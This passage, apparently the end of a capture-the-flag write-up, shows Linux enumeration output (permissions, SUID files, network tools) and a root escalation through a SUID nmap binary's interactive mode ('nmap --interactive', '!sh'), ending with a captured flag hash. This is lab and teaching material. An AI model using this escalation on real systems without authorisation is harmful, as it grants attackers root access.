-rwxr-xr-x  1 root root 2260 Mar 13  2014 umountnfs.sh
-rwxr-xr-x  1 root root 1872 Mar 13  2014 umountroot
-rwxr-xr-x  1 root root 3111 Mar 13  2014 urandom
-rwxr-xr-x  1 root root 2666 Oct  8  2014 x11-common


[-] /etc/init/ config file permissions:
total 316
drwxr-xr-x  2 root root 4096 Nov 13  2015 .
drwxr-xr-x 77 root root 4096 Nov 24 12:41 ..
-rw-r--r--  1 root root  328 Feb 22  2014 bootmisc.sh.conf
-rw-r--r--  1 root root  232 Feb 22  2014 checkfs.sh.conf
-rw-r--r--  1 root root  253 Feb 22  2014 checkroot-bootclean.sh.conf
-rw-r--r--  1 root root  307 Feb 22  2014 checkroot.sh.conf
-rw-r--r--  1 root root  266 Apr 11  2014 console.conf
-rw-r--r--  1 root root  250 Oct  9  2012 console-font.conf
-rw-r--r--  1 root root  509 Dec 21  2010 console-setup.conf
-rw-r--r--  1 root root 1122 Apr 11  2014 container-detect.conf
-rw-r--r--  1 root root  356 Apr 11  2014 control-alt-delete.conf
-rw-r--r--  1 root root  297 Feb  9  2013 cron.conf
-rw-r--r--  1 root root  273 Nov 19  2010 dmesg.conf
-rw-r--r--  1 root root 1377 Apr 11  2014 failsafe.conf
-rw-r--r--  1 root root  267 Apr 11  2014 flush-early-job-log.conf
-rw-r--r--  1 root root  284 Jul 23  2013 hostname.conf
-rw-r--r--  1 root root  557 Apr 16  2014 hwclock.conf
-rw-r--r--  1 root root  444 Apr 16  2014 hwclock-save.conf
-rw-r--r--  1 root root  689 Apr 10  2014 kmod.conf
-rw-r--r--  1 root root  268 Feb 22  2014 mountall-bootclean.sh.conf
-rw-r--r--  1 root root 1232 Feb 22  2014 mountall.conf
-rw-r--r--  1 root root  349 Feb 22  2014 mountall-net.conf
-rw-r--r--  1 root root  261 Feb 22  2014 mountall-reboot.conf
-rw-r--r--  1 root root  311 Feb 22  2014 mountall.sh.conf
-rw-r--r--  1 root root 1201 Feb 22  2014 mountall-shell.conf
-rw-r--r--  1 root root  327 Feb 22  2014 mountdevsubfs.sh.conf
-rw-r--r--  1 root root  405 Feb 22  2014 mounted-debugfs.conf
-rw-r--r--  1 root root  730 Feb 22  2014 mounted-dev.conf
-rw-r--r--  1 root root  480 Feb 22  2014 mounted-proc.conf
-rw-r--r--  1 root root  618 Feb 22  2014 mounted-run.conf
-rw-r--r--  1 root root 1890 Feb 22  2014 mounted-tmp.conf
-rw-r--r--  1 root root  903 Feb 22  2014 mounted-var.conf
-rw-r--r--  1 root root  323 Feb 22  2014 mountkernfs.sh.conf
-rw-r--r--  1 root root  249 Feb 22  2014 mountnfs-bootclean.sh.conf
-rw-r--r--  1 root root  313 Feb 22  2014 mountnfs.sh.conf
-rw-r--r--  1 root root  238 Feb 22  2014 mtab.sh.conf
-rw-r--r--  1 root root 2493 Mar 20  2014 networking.conf
-rw-r--r--  1 root root 1109 May  8  2014 network-interface.conf
-rw-r--r--  1 root root  530 Mar 20  2014 network-interface-container.conf
-rw-r--r--  1 root root 1756 May  4  2013 network-interface-security.conf
-rw-r--r--  1 root root  534 Feb 17  2014 passwd.conf
-rw-r--r--  1 root root  519 Mar 13  2014 plymouth.conf
-rw-r--r--  1 root root  326 Mar 13  2014 plymouth-log.conf
-rw-r--r--  1 root root  675 Mar 13  2014 plymouth-ready.conf
-rw-r--r--  1 root root  778 Mar 13  2014 plymouth-shutdown.conf
-rw-r--r--  1 root root  899 Mar 13  2014 plymouth-splash.conf
-rw-r--r--  1 root root  796 Mar 13  2014 plymouth-stop.conf
-rw-r--r--  1 root root  421 Apr 11  2014 plymouth-upstart-bridge.conf
-rw-r--r--  1 root root  363 Jan  6  2014 procps.conf
-rw-r--r--  1 root root  661 Apr 11  2014 rc.conf
-rw-r--r--  1 root root  683 Apr 11  2014 rcS.conf
-rw-r--r--  1 root root 1543 Apr 11  2014 rc-sysinit.conf
-rw-r--r--  1 root root  457 Dec 13  2012 resolvconf.conf
-rw-r--r--  1 root root  426 Apr 18  2013 rsyslog.conf
-rw-r--r--  1 root root  230 Mar 18  2011 setvtrgb.conf
-rw-r--r--  1 root root  277 Apr 11  2014 shutdown.conf
-rw-r--r--  1 root root  641 May  2  2014 ssh.conf.back
-rw-r--r--  1 root root  711 Mar 13  2014 startpar-bridge.conf
-rw-r--r--  1 root root  348 Apr 11  2014 tty1.conf
-rw-r--r--  1 root root  333 Apr 11  2014 tty2.conf
-rw-r--r--  1 root root  333 Apr 11  2014 tty3.conf
-rw-r--r--  1 root root  333 Apr 11  2014 tty4.conf
-rw-r--r--  1 root root  232 Apr 11  2014 tty5.conf
-rw-r--r--  1 root root  232 Apr 11  2014 tty6.conf
-rw-r--r--  1 root root  337 Apr 14  2014 udev.conf
-rw-r--r--  1 root root  645 Sep 12  2014 udev-fallback-graphics.conf
-rw-r--r--  1 root root  768 Apr 14  2014 udev-finish.conf
-rw-r--r--  1 root root  356 Apr 14  2014 udevmonitor.conf
-rw-r--r--  1 root root  352 Apr 14  2014 udevtrigger.conf
-rw-r--r--  1 root root  473 Feb 28  2014 ufw.conf
-rw-r--r--  1 root root  412 Apr 11  2014 upstart-file-bridge.conf
-rw-r--r--  1 root root  329 Apr 11  2014 upstart-socket-bridge.conf
-rw-r--r--  1 root root  553 Apr 11  2014 upstart-udev-bridge.conf
-rw-r--r--  1 root root  889 Mar 25  2013 ureadahead.conf
-rw-r--r--  1 root root  683 Mar 25  2013 ureadahead-other.conf
-r--r--r--  1 root root  901 Nov 13  2015 vmware-tools.conf
-rw-r--r--  1 root root  351 Nov 13  2015 vmware-tools-thinprint.conf
-rw-r--r--  1 root root  737 May 16  2013 vsftpd.conf
-rw-r--r--  1 root root 1521 Apr 11  2014 wait-for-state.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 240K
drwxr-xr-x 4 root root 4.0K Jun 24  2015 system
-rwxr-xr-x 1 root root 235K Apr 15  2015 systemd-udevd

/lib/systemd/system:
total 52K
drwxr-xr-x 2 root root 4.0K Jun 24  2015 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Jun 24  2015 sysinit.target.wants
-rw-r--r-- 1 root root  199 May  6  2015 rsyslog.service
lrwxrwxrwx 1 root root   21 Apr 15  2015 udev.service -> systemd-udevd.service
-rw-r--r-- 1 root root  788 Apr 15  2015 systemd-udevd.service
-rw-r--r-- 1 root root  823 Apr 15  2015 systemd-udev-settle.service
-rw-r--r-- 1 root root  715 Apr 15  2015 systemd-udev-trigger.service
-rw-r--r-- 1 root root  578 Apr 15  2015 systemd-udevd-control.socket
-rw-r--r-- 1 root root  575 Apr 15  2015 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  344 May  2  2014 ssh.service
-rw-r--r-- 1 root root  196 May  2  2014 ssh@.service
-rw-r--r-- 1 root root  216 May  2  2014 ssh.socket
-rw-r--r-- 1 root root  188 Apr 17  2014 rsync.service
-rw-r--r-- 1 root root  272 Feb  5  2014 sudo.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Apr 15  2015 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Apr 15  2015 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Apr 15  2015 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 31 Apr 15  2015 systemd-udev-trigger.service -> ../systemd-udev-trigger.service


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.9p5


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/local/bin/nmap
/usr/bin/gcc
/usr/bin/curl


[-] Installed compilers:
ii  g++                             4:4.8.2-1ubuntu6                 amd64        GNU C++ compiler
ii  g++-4.8                         4.8.4-2ubuntu1~14.04             amd64        GNU C++ compiler
ii  gcc                             4:4.8.2-1ubuntu6                 amd64        GNU C compiler
ii  gcc-4.8                         4.8.4-2ubuntu1~14.04             amd64        GNU C compiler


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1217 Nov 13  2015 /etc/passwd
-rw-r--r-- 1 root root 604 Nov 13  2015 /etc/group
-rw-r--r-- 1 root root 665 Feb 20  2014 /etc/profile
-rw-r----- 1 root shadow 982 Nov 14  2015 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown


[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap


[-] SGID files:
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-touchlock
-rwxr-sr-x 1 root utmp 421768 Nov  7  2013 /usr/bin/screen
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-unlock
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-lock
-rwxr-sr-x 1 root crontab 35984 Feb  9  2013 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 54968 Feb 17  2014 /usr/bin/chage
-rwxr-sr-x 1 root shadow 23360 Feb 17  2014 /usr/bin/expiry
-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /usr/bin/dotlockfile
-rwxr-sr-x 1 root ssh 284784 May 12  2014 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 19024 Feb 12  2015 /usr/bin/wall
-rwxr-sr-x 1 root shadow 35536 Jan 31  2014 /sbin/unix_chkpwd


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 604 Nov  7  2013 /etc/deluser.conf
-rw-r--r-- 1 root root 703 Jan 22  2014 /etc/logrotate.conf
-rw-r--r-- 1 root root 771 May 18  2013 /etc/insserv.conf
-rw-r--r-- 1 root root 34 Jun 24  2015 /etc/ld.so.conf
-rw-r--r-- 1 root root 2109 Sep 16  2015 /etc/sysctl.conf
-rw-r--r-- 1 root root 2969 Feb 23  2014 /etc/debconf.conf
-rw-r--r-- 1 root root 7773 Jun 24  2015 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 191 Dec  4  2013 /etc/libaudit.conf
-rw-r--r-- 1 root root 956 Feb 19  2014 /etc/mke2fs.conf
-rw-r--r-- 1 root root 321 Apr 16  2014 /etc/blkid.conf
-rw-r--r-- 1 root root 475 Feb 20  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 1320 Aug 19  2014 /etc/rsyslog.conf
-rw-r--r-- 1 root root 2981 Jun 24  2015 /etc/adduser.conf
-rw-r--r-- 1 root root 2584 Oct 10  2012 /etc/gai.conf
-rw-r--r-- 1 root root 92 Feb 20  2014 /etc/host.conf
-rw-r--r-- 1 root root 1260 Jul  1  2013 /etc/ucf.conf
-rw-r--r-- 1 root root 111 Jun 24  2015 /etc/kernel-img.conf
-rw-r--r-- 1 root root 5790 Sep 16  2015 /etc/vsftpd.conf
-rw-r--r-- 1 root root 552 Jan 31  2014 /etc/pam.conf


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Jun 24  2015 .
drwxr-xr-x 11 root root 4096 Jun 24  2015 ..


### SCAN COMPLETE ####################################
```
<br />
The interesting thing is we can run nmap as root since the SUID bit is set:
```
[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
```
<br />
At this point collecting the flag is super easy, since this nmap version supports interactive mode and allows us to run commands as root. 
```
robot@linux:/tmp$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# whoami
root

# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
Machine rooted ;)
